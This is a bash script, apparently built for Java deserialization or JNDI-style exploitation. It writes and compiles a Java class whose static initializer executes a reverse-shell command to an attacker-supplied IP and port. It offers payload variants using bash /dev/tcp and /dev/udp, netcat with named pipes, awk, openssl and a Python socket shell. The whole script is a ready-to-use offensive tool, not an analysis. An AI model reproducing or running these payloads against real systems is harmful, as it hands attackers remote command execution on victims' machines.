#/bin/bash

if [ $# -eq 0 ]
then
	echo "Usage: $0 [IP] [PORT] [SHELL]"
	echo "Options:"
	echo "		[IP]    - Attacker's IP Address"
	echo "		[PORT]  - Listening port (Default: 1337)"
	echo "		[SHELL] - Must be set to one of the following: (Default: bash-tcp)"
	echo "				awk, bash-tcp, bash-udp, nc, nc-openbsd, nc-busybox, openssl, python, telnet"
	exit 1
fi

ip=$1

if [ -z "$2" ]
then
	port='1337'
else
	port=$2
fi

awk_exploit="awk 'BEGIN {s = \"/inet/tcp/0/$ip/$port\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
bashtcp_exploit="bash -i >& /dev/tcp/$ip/$port 0>&1"
bashudp_exploit="sh -i >& /dev/udp/$ip/$port 0>&1"
nc_trad_exploit="nc -e /bin/bash $ip $port"
nc_obsd_exploit="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
nc_bbox_exploit="rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
openssl_exploit="ncat --ssl -vv -l -p $port; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip:$port > /tmp/s; rm /tmp/s"
python_exploit="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
telnet_exploit="nc -lvp 8080 & nc -lvp 8081"

# FIXME: Might fix the spaghetti code someday, but I'll leave it for now since it works lol
if [ -z "$3" ]; then
	shell=$bashtcp_exploit
elif [ "$3" = "awk" ]; then
	shell=$awk_exploit
elif [ "$3" = "bash-tcp" ]; then
	shell=$bashtcp_exploit
elif [ "$3" = "bash-udp" ]; then
	shell=$bashudp_exploit
elif [ "$3" = "nc" ]; then
	shell=$nc_trad_exploit
elif [ "$3" = "nc-openbsd" ]; then
	shell=$nc_obsd_exploit
elif [ "$3" = "nc-busybox" ]; then
	shell=$nc_bbox_exploit
elif [ "$3" = "openssl" ]; then
	shell=$openssl_exploit
elif [ "$3" = "python" ]; then
	shell=$python_exploit
elif [ "$3" = "telnet" ]; then
	shell=$telnet_exploit
else
	echo "ERROR: Cannot identify shell command to use"
	exit 2
fi

echo "public class Exploit {" > Exploit.java
echo "	static {" >> Exploit.java
echo "		try {" >> Exploit.java
echo "			java.lang.Runtime.getRuntime().exec(\"$shell\");" >> Exploit.java
echo "		} catch (Exception e) {" >> Exploit.java
echo "			e.printStackTrace();" >> Exploit.java
echo "		}" >> Exploit.java
echo "	}" >> Exploit.java
echo "}" >> Exploit.java

if ! command -v javac >/dev/null; then
	echo "javac was not found, you'll need to compile the exploit yourself."
	echo "The exploit source was saved in Exploit.java"
else
	javac Exploit.java
	rm Exploit.java
	echo "The exploit was saved in Exploit.class"
fi
